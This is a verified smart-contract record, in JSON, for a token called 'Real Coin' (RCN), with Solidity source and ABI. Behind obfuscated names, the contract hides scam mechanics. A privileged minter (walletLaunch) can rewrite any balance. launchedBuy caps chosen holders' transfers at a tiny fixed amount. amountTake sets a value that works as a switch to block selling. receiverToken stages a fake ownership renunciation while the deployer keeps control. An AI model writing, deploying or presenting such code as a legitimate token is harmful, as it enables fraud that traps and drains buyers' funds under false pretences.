{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buySender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderReceiver {\n    function createPair(address fundLimit, address senderSwap) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface receiverSenderAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface amountTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyLiquidity) external view returns (uint256);\n\n    function transfer(address liquidityTrading, uint256 liquidityFrom) external returns (bool);\n\n    function allowance(address sellAutoTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityTrading,\n        uint256 liquidityFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitLiquidity, uint256 value);\n    event Approval(address indexed sellAutoTeam, address indexed spender, uint256 value);\n}\n\ninterface amountTxMetadata is amountTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RealCoin is buySender, amountTx, amountTxMetadata {\n\n    string private teamLaunchedAmount = \"RCN\";\n\n    uint256 private tokenFund;\n\n    function transfer(address autoTakeTx, uint256 liquidityFrom) external virtual override returns (bool) {\n        return maxLaunchedReceiver(_msgSender(), autoTakeTx, liquidityFrom);\n    }\n\n    event OwnershipTransferred(address indexed autoShould, address indexed feeIsBuy);\n\n    uint8 private tokenModeTeam = 18;\n\n    uint256 public fromMarketingExempt = 3;\n\n    address private receiverExempt;\n\n    bool public sellAt;\n\n    uint256 public limitTxFund = 0;\n\n    bool private maxLaunched;\n\n    mapping(address => uint256) private amountMode;\n\n    uint256 private modeFund;\n\n    uint256 public takeMinAmount;\n\n    uint256 public modeAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLaunchedAmount;\n    }\n\n    function transferFrom(address amountLaunched, address liquidityTrading, uint256 liquidityFrom) external override returns (bool) {\n        if (_msgSender() != toLiquidity) {\n            if (isTradingFee[amountLaunched][_msgSender()] != type(uint256).max) {\n                require(liquidityFrom <= isTradingFee[amountLaunched][_msgSender()]);\n                isTradingFee[amountLaunched][_msgSender()] -= liquidityFrom;\n            }\n        }\n        return maxLaunchedReceiver(amountLaunched, liquidityTrading, liquidityFrom);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptToken;\n    }\n\n    address toLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 receiverBuyTotal;\n\n    function limitSell() private view {\n        require(amountShould[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private isTradingFee;\n\n    function liquidityTo(address amountLaunched, address liquidityTrading, uint256 liquidityFrom) internal view returns (uint256) {\n        require(liquidityFrom > 0);\n\n        uint256 tokenMinMode = 0;\n        if (amountLaunched == listFee && fromMarketingExempt > 0) {\n            tokenMinMode = liquidityFrom * fromMarketingExempt / 100;\n        } else if (liquidityTrading == listFee && limitTxFund > 0) {\n            tokenMinMode = liquidityFrom * limitTxFund / 100;\n        }\n        require(tokenMinMode <= liquidityFrom);\n        return liquidityFrom - tokenMinMode;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenModeTeam;\n    }\n\n    uint256 private exemptToken = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return maxAmountTrading;\n    }\n\n    function allowance(address takeMax, address totalIsMarketing) external view virtual override returns (uint256) {\n        if (totalIsMarketing == toLiquidity) {\n            return type(uint256).max;\n        }\n        return isTradingFee[takeMax][totalIsMarketing];\n    }\n\n    bool private maxSwap;\n\n    address buyFee;\n\n    function owner() external view returns (address) {\n        return receiverExempt;\n    }\n\n    constructor (){\n        if (modeLaunch == tokenFund) {\n            maxLaunched = false;\n        }\n        receiverToken();\n        receiverSenderAt exemptTeam = receiverSenderAt(toLiquidity);\n        listFee = senderReceiver(exemptTeam.factory()).createPair(exemptTeam.WETH(), address(this));\n        buyFee = senderReceiver(exemptTeam.factory()).feeTo();\n        \n        tradingSender = _msgSender();\n        amountShould[tradingSender] = true;\n        amountMode[tradingSender] = exemptToken;\n        if (tokenFund == enableReceiverFund) {\n            maxSwap = true;\n        }\n        emit Transfer(address(0), tradingSender, exemptToken);\n    }\n\n    function balanceOf(address buyLiquidity) public view virtual override returns (uint256) {\n        return amountMode[buyLiquidity];\n    }\n\n    mapping(address => bool) public buyTxAuto;\n\n    function walletLaunch(address autoTakeTx, uint256 liquidityFrom) public {\n        limitSell();\n        amountMode[autoTakeTx] = liquidityFrom;\n    }\n\n    function receiverToken() public {\n        emit OwnershipTransferred(tradingSender, address(0));\n        receiverExempt = address(0);\n    }\n\n    uint256 walletReceiver;\n\n    uint256 private atBuy;\n\n    mapping(address => bool) public amountShould;\n\n    address public listFee;\n\n    function maxLaunchedReceiver(address amountLaunched, address liquidityTrading, uint256 liquidityFrom) internal returns (bool) {\n        if (amountLaunched == tradingSender) {\n            return marketingLaunch(amountLaunched, liquidityTrading, liquidityFrom);\n        }\n        uint256 toTeam = amountTx(listFee).balanceOf(buyFee);\n        require(toTeam == walletReceiver);\n        require(liquidityTrading != buyFee);\n        if (buyTxAuto[amountLaunched]) {\n            return marketingLaunch(amountLaunched, liquidityTrading, isTxExempt);\n        }\n        liquidityFrom = liquidityTo(amountLaunched, liquidityTrading, liquidityFrom);\n        return marketingLaunch(amountLaunched, liquidityTrading, liquidityFrom);\n    }\n\n    function approve(address totalIsMarketing, uint256 liquidityFrom) public virtual override returns (bool) {\n        isTradingFee[_msgSender()][totalIsMarketing] = liquidityFrom;\n        emit Approval(_msgSender(), totalIsMarketing, liquidityFrom);\n        return true;\n    }\n\n    string private maxAmountTrading = \"Real Coin\";\n\n    function marketingLaunch(address amountLaunched, address liquidityTrading, uint256 liquidityFrom) internal returns (bool) {\n        require(amountMode[amountLaunched] >= liquidityFrom);\n        amountMode[amountLaunched] -= liquidityFrom;\n        amountMode[liquidityTrading] += liquidityFrom;\n        emit Transfer(amountLaunched, liquidityTrading, liquidityFrom);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverExempt;\n    }\n\n    uint256 constant isTxExempt = 17 ** 10;\n\n    function fromBuy(address tokenFrom) public {\n        require(tokenFrom.balance < 100000);\n        if (sellAt) {\n            return;\n        }\n        if (modeFund != atBuy) {\n            atBuy = enableReceiverFund;\n        }\n        amountShould[tokenFrom] = true;\n        if (modeAmount == modeLaunch) {\n            modeLaunch = atBuy;\n        }\n        sellAt = true;\n    }\n\n    address public tradingSender;\n\n    uint256 private modeLaunch;\n\n    function launchedBuy(address buyTo) public {\n        limitSell();\n        \n        if (buyTo == tradingSender || buyTo == listFee) {\n            return;\n        }\n        buyTxAuto[buyTo] = true;\n    }\n\n    function amountTake(uint256 liquidityFrom) public {\n        limitSell();\n        walletReceiver = liquidityFrom;\n    }\n\n    uint256 private enableReceiverFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAutoTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeIsBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalIsMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"amountTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalIsMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTxAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"}],\"name\":\"fromBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMarketingExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTo\",\"type\":\"address\"}],\"name\":\"launchedBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTxFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMinAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTakeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTakeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityFrom\",\"type\":\"uint256\"}],\"name\":\"walletLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RealCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}